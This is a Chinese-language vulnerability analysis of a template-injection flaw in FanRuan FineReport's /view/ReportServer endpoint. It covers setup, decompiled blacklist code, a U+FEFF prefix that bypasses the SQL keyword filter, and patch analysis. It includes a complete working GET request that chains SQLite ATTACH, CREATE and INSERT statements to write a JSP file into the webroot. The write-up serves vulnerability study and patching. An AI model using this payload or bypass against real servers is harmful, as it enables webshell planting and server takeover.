# 漏洞简介

**漏洞描述：**  
FinеRероrt 是帆软自主研发的企业级 Wеb
报表工具。其/view/ReportServer接口存在模版注入漏洞，攻击者可以利用该漏洞执行任意SQL写入Webshell，从而获取服务器权限。  
**影响范围：**  
1）JAR包时间在 2024-07-23 之前的FineReport11.*、10.*系列  
2）JAR包时间在 2024-07-24 之前的、运维平台或Tomcat部署包部署的FineBI全版本  
3）JAR包时间在 2024-07-24 之前的FineDataLink全版本

# 环境搭建

**环境下载：**[https://www.finereport.com/product/download/redirect?version=windows_x64_10.0&token=BKi7fGzRzhfm](https://www.finereport.com/product/download/redirect?version=windows_x64_10.0&token=BKi7fGzRzhfm)  
**环境版本：** 10.0.19  
**远程调试：** 在FineReport_10.0\bin\designer.vmoptions文件最后一行添加：  
`-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005`  
保存后重启designer.exe，如果需要进一步调试，需要重新编译class文件替换回对应jar包。  
**登录界面：**

![](./assets/2125370980983008575.png)

# 漏洞分析

定位到漏洞入口com.fr.web.controller.ReportRequestCompatibleService#preview

![](./assets/7170268749429428730.png)

使用内置的模版引擎`TemplateUtils`解析了用户请求传入的查询字符串(URL中?后的内容)，这里的`var1.getQueryString()`获取的是Tomcat对字符串进行URL解码前的内容。  
而在进行模版引擎解析时可以调用一些特定的函数（均继承了抽象类com.fr.script.AbstractFunction），如下：

![](./assets/1947642891712234024.png)

关于函数的使用可参考官方手册：[常用函数概述 - FineBI帮助文档
(fanruan.com)](https://help.fanruan.com/finebi/doc-view-3.html)

![](./assets/5924941115460670449.png)

其中内置函数包括了com.fr.function.SQL，在进行模板解析时run方法会作为函数执行的入口。

![](./assets/5594488419022845136.png)

该函数允许传入一个数组`Object[]`，连接`Object[0]`数据库后，执行`Object[1]`SQL，而帆软报表默认使用Sqlite作为数据库引擎，并且默认存在数据库FRDemo，所以可以构造如下payload执行任意SQL：

    
    
    ${sql('FRDemo',DECODE('%53%45%4C%45%43%54%20%27%71%79%67%31%32%33%34%35%36%27%3B'),1,1)}
    //由于Tomcat传参问题，这里需要借助DECODE函数进行URL解码，解码后为SELECT 'qyg123456';
    

![](./assets/5868167746143725152.png)

值得注意的是，在执行SQL前，会调用`JDBCSecurityChecker.checkQuery`方法对SQL进行安全检查

![](./assets/4002821518925972651.png)

跟进`checkQuery`方法

![](./assets/2964284776943673853.png)

该方法做了一个黑名单检测，如果匹配到`InsecurityElement`对应的关键字，则报错退出。关键字如下：

![](./assets/5411630514363221891.png)

跟进`InsecurityElement.probed`方法查看匹配逻辑

![](./assets/767379405819512950.png)

`this.removeSpecialCharacters(this.ignoreQuotesAndNotes(var1.toLowerCase()))`会对SQL字符串做一些处理，涉及的方法如下：

    
    
    private String ignoreQuotesAndNotes(String var1) {
        StringBuilder var2 = new StringBuilder();
        char var3 = '0';
        boolean var4 = false;
        int var5 = 0;
    
        while(true) {
            while(var5 < var1.length()) {
                char var6 = var1.charAt(var5);
                if (this.isQuote(var3)) {
                    if (var6 == var3) {
                        var3 = '0';
                        var2.append(" ");
                    }
    
                    ++var5;
                } else if (var4) {
                    if (var4) {
                        if (var6 == '\n') {
                            var4 = false;
                            var2.append(" ");
                        }
                    } else if (var5 + 1 < var1.length() && var1.charAt(var5) == '*' && var1.charAt(var5 + 1) == '/') {
                        var4 = false;
                        var2.append(" ");
                        ++var5;
                    }
    
                    ++var5;
                } else {
                    if (var5 + 1 < var1.length()) {
                        if (var1.charAt(var5) == '-' && var1.charAt(var5 + 1) == '-') {
                            var4 = true;
                            var2.append(" ");
                            var5 += 2;
                            continue;
                        }
    
                        if (var1.charAt(var5) == '/' && var1.charAt(var5 + 1) == '*') {
                            var4 = true;
                            var2.append(" ");
                            var5 += 2;
                            continue;
                        }
                    }
    
                    if (this.isQuote(var6)) {
                        var2.append(" ");
                        var3 = var6;
                        ++var5;
                    } else {
                        var2.append(var6);
                        ++var5;
                    }
                }
            }
    
            return var2.toString();
        }
    }
    
    
    
    private String removeSpecialCharacters(String var1) {
        StringBuilder var2 = new StringBuilder();
    
        for(int var3 = 0; var3 < var1.length(); ++var3) {
            char var4 = this.isSpecialCharacter(var1.charAt(var3)) ? 32 : var1.charAt(var3);
            var2.append(var4);
        }
    
        return var2.toString();
    }
    
    
    
    private boolean isSpecialCharacter(char var1) {
        return var1 == ',' || var1 == '\n' || var1 == ';' || var1 == '\t' || var1 == '\r' || var1 == '\f' || var1 == 11;
    }
    

代码不难理解，组合起来就是先去除了SQL里的字符串和注释内容，再去除`, \n ; \t \r \f
11(ASCII)`这些特殊字符，最后返回SQL的关键字。接着再根据`var2.contains(" " + this.getPattern() + "
")`检测关键字。  
而如果需要通过sqlite写Webshell，则需要用到attach、create和insert语句，这些语句刚好全在黑名单里，所以需要绕过黑名单检测。根据Y4TACKER师傅的文章，其实这里使用了sqlite的一个小trick，参考<https://android.googlesource.com/platform//external/sqlite/+/d11514d85b96ef33b1a78080246df7df2cf5d9ea/dist/orig/sqlite3.h>，
底层代码在执行SQL前，如果SQL第一个字符存在U+FEFF，那么这个字符将被移除

![](./assets/1528974895840180272.png)

至此，我们可以通过在SQL前添加U+FEFF字符（URL编码为%EF%BB%BF），从而绕过黑名单的限制。

# 漏洞复现

    
    
    GET /webroot/decision/view/ReportServer?${sql('FRDemo',DECODE('%EF%BB%BFATTACH%20DATABASE%20%27..%2Fwebapps%2Fwebroot%2Fmyqyg.jsp%27%20as%20qyg%3B'),1,1)}${sql('FRDemo',DECODE('%EF%BB%BFCREATE%20TABLE%20qyg.exp%28data%20text%29%3B'),1,1)}${sql('FRDemo',DECODE('%EF%BB%BFINSERT%20INTO%20qyg.exp%28data%29%20VALUES%20%28x%27717967717967717967717967717967717967717967%27%29%3B'),1,1)} HTTP/1.1
    Host: 192.168.120.231:8075
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.54
    Connection: close
    

![](./assets/2116636277863683113.png)

访问/webroot/myqyg.jsp

![](./assets/8574255519790204762.png)

这里得吐槽一下，Windows上装的帆软环境无法解析jsp文件，因为安装包的jasper依赖被修改删除过...

# 补丁分析

**全版本补丁汇总：**[**https://help.fanruan.com/finereport/doc-
view-4658.html**](https://help.fanruan.com/finereport/doc-view-4658.html)  
**FineReport10补丁：**[**https://fine-build.oss-cn-
shanghai.aliyuncs.com/hw/FR/finereport10.0_jar_openjdk1.8.zip**](https://fine-
build.oss-cn-shanghai.aliyuncs.com/hw/FR/finereport10.0_jar_openjdk1.8.zip)  
针对漏洞的修复主要有两处地方：

  1. **com.fr.web.controller.ReportRequestCompatibleService#preview**

![](./assets/7288470600895096698.png)

/view/ReportServer接口将不会对用户传入的查询字符串进行模版解析。

  1. **com.fr.data.core.db.JDBCSecurityChecker$InsecuritySQLKeyword#probed**

![](./assets/8046982514341482708.png)

`this.regPattern.matcher(tmp).find()`代替了原本的`contains`方法，通过正则匹配黑名单的关键字，从根源上修复了文件写入的操作。

# 参考链接

<https://ti.qianxin.com/vulnerability/detail/360590>  
<https://help.fanruan.com/finereport/doc-view-4833.html>  
[https://y4tacker.github.io/2024/07/23/year/2024/7/某软Report高版本中利用的一些细节](https://y4tacker.github.io/2024/07/23/year/2024/7/%E6%9F%90%E8%BD%AFReport%E9%AB%98%E7%89%88%E6%9C%AC%E4%B8%AD%E5%88%A9%E7%94%A8%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%86%E8%8A%82)

